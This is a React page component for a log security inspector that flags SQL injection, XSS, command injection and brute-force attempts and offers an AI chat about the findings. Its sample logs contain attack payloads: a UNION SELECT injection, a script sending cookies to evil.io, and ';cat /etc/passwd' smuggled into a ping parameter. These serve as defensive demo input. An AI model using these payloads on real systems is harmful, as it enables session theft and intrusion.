import { useState } from 'react';
import {
  ResponsiveContainer,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip as ChartTooltip,
} from 'recharts';
import client from '../api/client';
import { SeverityBadge } from '../components/StatCard';

const SAMPLES = {
  sshd: `Jul 9 10:22:01 server sshd: Failed password for root from 45.33.12.9 port 51422
Jul 9 10:22:03 server sshd: Failed password for root from 45.33.12.9 port 51430
Jul 9 10:22:05 server sshd: Failed password for root from 45.33.12.9 port 51441
Jul 9 10:22:06 server sshd: Failed password for admin from 45.33.12.9 port 51502
Jul 9 10:22:09 server sshd: Failed password for root from 45.33.12.9 port 51550
Jul 9 10:22:11 server sshd: Failed password for root from 45.33.12.9 port 51601`,
  web: `127.0.0.1 - - [09/Jul/2026:10:23:01] "GET /product?id=1 UNION SELECT username,password FROM users-- " 200
127.0.0.1 - - [09/Jul/2026:10:23:44] "GET /search?q=<script>document.location='http://evil.io/'+document.cookie</script>" 200
198.51.100.7 - - [09/Jul/2026:10:24:10] "GET /ping?host=8.8.8.8;cat /etc/passwd" 200`,
  combined: `Jul 9 10:22:01 server sshd: Failed password for root from 45.33.12.9 port 51422
Jul 9 10:22:03 server sshd: Failed password for root from 45.33.12.9 port 51430
127.0.0.1 - - [09/Jul/2026:10:23:01] "GET /product?id=1 UNION SELECT username,password FROM users-- " 200
127.0.0.1 - - [09/Jul/2026:10:23:44] "GET /search?q=<script>document.location='http://evil.io/'+document.cookie</script>" 200
198.51.100.7 - - [09/Jul/2026:10:24:10] "GET /ping?host=8.8.8.8;cat /etc/passwd" 200`
};

export default function LogAnalyzer() {
  const [logText, setLogText] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedLogLine, setSelectedLogLine] = useState(null);
  const [aiExplanation, setAiExplanation] = useState('');
  const [aiLoading, setAiLoading] = useState(false);
  const [askInput, setAskInput] = useState('');
  const [chatHistory, setChatHistory] = useState([]);
  const [chatLoading, setChatLoading] = useState(false);

  async function handleAnalyze() {
    if (!logText.trim()) { setError('Paste log content first, or load a sample.'); return; }
    setError(''); setResult(null); setAiExplanation(''); setSelectedLogLine(null);
    setChatHistory([]); setAskInput(''); setLoading(true);
    try {
      const { data } = await client.post('/logs/analyze', { logText });
      setResult(data);
    } catch (err) {
      setError(err.response?.data?.error || 'Analysis failed.');
    } finally {
      setLoading(false);
    }
  }

  async function handleAIExplain() {
    if (!result) return;
    setAiLoading(true); setAiExplanation('');
    try {
      const { data } = await client.post('/logs/explain', { findings: result.findings, summary: result.summary });
      setAiExplanation(data.explanation);
    } catch { setError('Failed to fetch AI mitigation report.'); }
    finally { setAiLoading(false); }
  }

  async function handleAskChat(text) {
    const trimmed = text.trim();
    if (!trimmed) return;
    setChatHistory(prev => [...prev, { role: 'user', text: trimmed }]);
    setAskInput(''); setChatLoading(true);
    try {
      const { data } = await client.post('/logs/ask', { question: trimmed, findings: result.findings, summary: result.summary });
      setChatHistory(prev => [...prev, { role: 'bot', text: data.answer }]);
    } catch { setChatHistory(prev => [...prev, { role: 'bot', text: '[ERROR] Neural link disrupted. AI Sentinel offline.' }]); }
    finally { setChatLoading(false); }
  }

  function handleFile(e) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (evt) => setLogText(evt.target.result);
    reader.readAsText(file);
  }

  function renderMarkdown(text) {
    if (!text) return null;
    return text.split('\n').map((line, index) => {
      let trimmed = line.trim();
      if (trimmed.startsWith('###')) return <h4 key={index} style={{ color: 'var(--accent-cyan)', marginTop: 14, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>{trimmed.replace('###', '').trim()}</h4>;
      if (trimmed.startsWith('##')) return <h3 key={index} style={{ color: 'var(--accent-cyan)', marginTop: 18, marginBottom: 8, textTransform: 'uppercase', letterSpacing: '0.05em' }}>{trimmed.replace('##', '').trim()}</h3>;
      if (trimmed.startsWith('*') || trimmed.startsWith('-')) {
        const cleanLine = trimmed.substring(1).trim();
        const parts = cleanLine.split('**');
        return <li key={index} style={{ marginLeft: 16, marginBottom: 4, color: 'var(--text-dim)' }}>{parts.map((p, i) => i % 2 === 1 ? <strong key={i} style={{ color: 'var(--text)' }}>{p}</strong> : p)}</li>;
      }
      const parts = line.split('**');
      return <p key={index} style={{ marginBottom: 8, color: 'var(--text-dim)', fontSize: '13px' }}>{parts.map((p, i) => i % 2 === 1 ? <strong key={i} style={{ color: 'var(--accent-cyan)' }}>{p}</strong> : p)}</p>;
    });
  }

  let chartData = [];
  if (result && result.findings.length > 0) {
    const categoryFreq = {};
    result.findings.forEach(f => { categoryFreq[f.type] = (categoryFreq[f.type] || 0) + 1; });
    chartData = Object.entries(categoryFreq).map(([name, count]) => ({ name, count }));
  }

  const logLines = logText.split('\n').filter(Boolean);

  return (
    <div className="page">
      {/* HUD Page Header */}
      <div className="hud-page-header">
        <div className="hud-page-header-left">
          <div className="hud-page-label">INTRUSION ANALYSIS · HEURISTICS ENGINE</div>
          <h2 className="hud-page-title">LOG SECURITY INSPECTOR</h2>
          <p className="hud-page-desc">
            Upload server console messages, access logs, or auth records. The neural heuristics engine classifies threats using SQLi, XSS, Cmd Injection, and brute-force pattern libraries.
          </p>
        </div>
      </div>

      {/* Log Input Panel */}
      <div className="panel">
        <h3>⬡ LOG INGESTION TERMINAL</h3>
        <textarea
          className="log-textarea"
          rows={8}
          placeholder="// PASTE SERVER LOG ENTRIES HERE OR LOAD A SAMPLE BELOW..."
          value={logText}
          onChange={(e) => setLogText(e.target.value)}
          style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '12px' }}
        />
        <div className="log-actions">
          <label className="btn-outline file-btn">
            ↑ UPLOAD LOG FILE
            <input type="file" accept=".log,.txt" onChange={handleFile} hidden />
          </label>
          <button className="btn-outline" onClick={() => setLogText(SAMPLES.sshd)}>SSH BRUTE FORCE</button>
          <button className="btn-outline" onClick={() => setLogText(SAMPLES.web)}>WEB EXPLOIT</button>
          <button className="btn-outline" onClick={() => setLogText(SAMPLES.combined)}>COMBINED LOGS</button>
          <button className="btn-primary" onClick={handleAnalyze} disabled={loading} style={{ width: 'auto' }}>
            {loading ? 'SCANNING...' : '⬡ RUN INSPECTION'}
          </button>
        </div>
        {error && <div className="form-error">{error}</div>}
      </div>

      {result && (
        <>
          {/* Summary Stat Cards */}
          <div className="stat-grid stat-grid-4" style={{ marginTop: 24 }}>
            {[
              { label: 'LINES SCANNED', value: result.summary.totalLines, color: 'var(--accent-cyan)' },
              { label: 'THREAT HITS', value: result.summary.totalFindings, color: 'var(--accent-orange)' },
              { label: 'INTRUSION IPs', value: result.summary.uniqueSourceIps, color: 'var(--accent-red)' },
              { label: 'RISK RATING', value: result.summary.riskLevel, color: ['CRITICAL','HIGH'].includes(result.summary.riskLevel) ? 'var(--accent-red)' : 'var(--accent-green)' },
            ].map(({ label, value, color }) => (
              <div key={label} className="stat-card">
                <div className="stat-label">{label}</div>
                <div className="stat-value" style={{ color, fontSize: typeof value === 'string' ? '18px' : '26px' }}>{value}</div>
              </div>
            ))}
          </div>

          <div className="panel-grid">
            {/* Chart */}
            <section className="panel" style={{ marginBottom: 0 }}>
              <h3>VECTOR FREQUENCY MAP</h3>
              {chartData.length === 0 ? (
                <div className="hud-empty-state"><div className="hud-empty-icon">◈</div><div>NO THREAT VECTORS DETECTED</div></div>
              ) : (
                <ResponsiveContainer width="100%" height={210}>
                  <BarChart data={chartData} layout="vertical">
                    <defs>
                      <linearGradient id="vectorGrad" x1="0" y1="0" x2="1" y2="0">
                        <stop offset="0%" stopColor="var(--accent-red)" stopOpacity={0.15} />
                        <stop offset="100%" stopColor="var(--accent-red)" stopOpacity={0.9} />
                      </linearGradient>
                    </defs>
                    <CartesianGrid strokeDasharray="3 3" stroke="var(--border)" opacity={0.3} />
                    <XAxis type="number" stroke="var(--text-dim)" fontSize={11} tickLine={false} />
                    <YAxis dataKey="name" type="category" stroke="var(--accent-cyan)" fontSize={10} width={130} tickLine={false} />
                    <ChartTooltip contentStyle={{ background: 'var(--bg-elevated)', border: '1px solid var(--border-active)', borderRadius: 6, fontSize: 12 }} />
                    <Bar dataKey="count" fill="url(#vectorGrad)" radius={[0, 4, 4, 0]} />
                  </BarChart>
                </ResponsiveContainer>
              )}
            </section>

            {/* Terminal Gutter View */}
            <section className="panel" style={{ marginBottom: 0 }}>
              <h3>CONSOLE GUTTER VIEW</h3>
              <div className="log-console-box">
                {logLines.map((line, idx) => {
                  const lineNum = idx + 1;
                  const isHighlighted = result.findings.some(f => f.line === lineNum);
                  const isSelected = selectedLogLine === lineNum;
                  return (
                    <div
                      key={idx}
                      className={`log-console-line ${isSelected ? 'active' : ''}`}
                      style={{ color: isHighlighted && !isSelected ? 'var(--accent-orange)' : undefined }}
                      onClick={() => setSelectedLogLine(lineNum)}
                    >
                      <span className="log-line-num">{lineNum}</span>
                      <span className="log-line-text">{line}</span>
                    </div>
                  );
                })}
              </div>
            </section>
          </div>

          {/* AI Explainer */}
          <div style={{ margin: '24px 0 12px' }}>
            <button className="btn-primary" onClick={handleAIExplain} disabled={aiLoading} style={{ width: 'auto', display: 'inline-flex', alignItems: 'center', gap: 8 }}>
              {aiLoading ? '◈ NEURAL ANALYSIS RUNNING...' : '⬡ ANALYZE THREATS WITH SENTINEL AI'}
            </button>
          </div>

          {aiExplanation && (
            <div className="ai-mitigation-box">
              <h3>⬡ NEURAL THREAT INVESTIGATION REPORT</h3>
              <div className="ai-report-body">{renderMarkdown(aiExplanation)}</div>
            </div>
          )}

          {/* AI Chat Section */}
          <section className="log-chat-panel">
            <h3>⬡ CONSULT SENTINEL AI ABOUT THESE LOGS</h3>
            <div className="log-chat-window">
              {chatHistory.length === 0 ? (
                <div style={{ color: 'var(--text-dim)', fontSize: '12px', fontFamily: 'monospace', padding: 8 }}>
                  // Ask about suspicious events, IP locations, block strategies, or exploit scripts found in these logs.
                </div>
              ) : (
                chatHistory.map((msg, idx) => (
                  <div key={idx} className={`log-chat-bubble ${msg.role}`}>
                    {renderMarkdown(msg.text)}
                  </div>
                ))
              )}
              {chatLoading && <div className="log-chat-bubble bot" style={{ opacity: 0.6 }}>◈ AI Sentinel processing log context...</div>}
            </div>

            <div className="log-chat-suggestions">
              {["Which IP is the most critical threat?", "Why target the 'root' user?", "What firewall rules should block this?"].map((sug, idx) => (
                <button key={idx} className="log-chat-suggestion-chip" onClick={() => handleAskChat(sug)} disabled={chatLoading}>
                  ▷ {sug}
                </button>
              ))}
            </div>

            <form className="log-chat-input-row" onSubmit={(e) => { e.preventDefault(); handleAskChat(askInput); }}>
              <input
                type="text" value={askInput}
                onChange={(e) => setAskInput(e.target.value)}
                placeholder="// Query Sentinel AI about this log analysis..."
                disabled={chatLoading}
                style={{ fontFamily: 'monospace' }}
              />
              <button type="submit" className="btn-primary" disabled={chatLoading || !askInput.trim()} style={{ width: 'auto', minWidth: '80px' }}>
                QUERY
              </button>
            </form>
          </section>

          {/* Findings Table */}
          <section className="panel" style={{ marginTop: 24 }}>
            <h3>⬡ INTRUSION INCIDENT LOG</h3>
            {result.findings.length === 0 ? (
              <div className="hud-empty-state">
                <div className="hud-empty-icon">✓</div>
                <div style={{ color: 'var(--accent-green)' }}>NO SUSPICIOUS PATTERNS DETECTED</div>
              </div>
            ) : (
              <div className="table-wrap">
                <table className="data-table">
                  <thead>
                    <tr>
                      <th>LINE</th><th>TYPE</th><th>SEVERITY</th><th>SOURCE IP</th><th>SNIPPET</th>
                    </tr>
                  </thead>
                  <tbody>
                    {result.findings.map((f, i) => {
                      const isSelected = selectedLogLine === f.line;
                      return (
                        <tr
                          key={i}
                          className={`clickable ${isSelected ? 'active' : ''}`}
                          onClick={() => {
                            if (f.line) {
                              setSelectedLogLine(f.line);
                              const terminal = document.querySelector('.log-console-box');
                              const targetLine = terminal?.children[f.line - 1];
                              if (terminal && targetLine) terminal.scrollTop = targetLine.offsetTop - terminal.offsetTop - 50;
                            }
                          }}
                        >
                          <td className="mono">{f.line ?? '—'}</td>
                          <td>{f.type}</td>
                          <td><SeverityBadge severity={f.severity} /></td>
                          <td className="mono">{f.ip}</td>
                          <td className="mono small">{f.snippet}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </section>
        </>
      )}
    </div>
  );
}
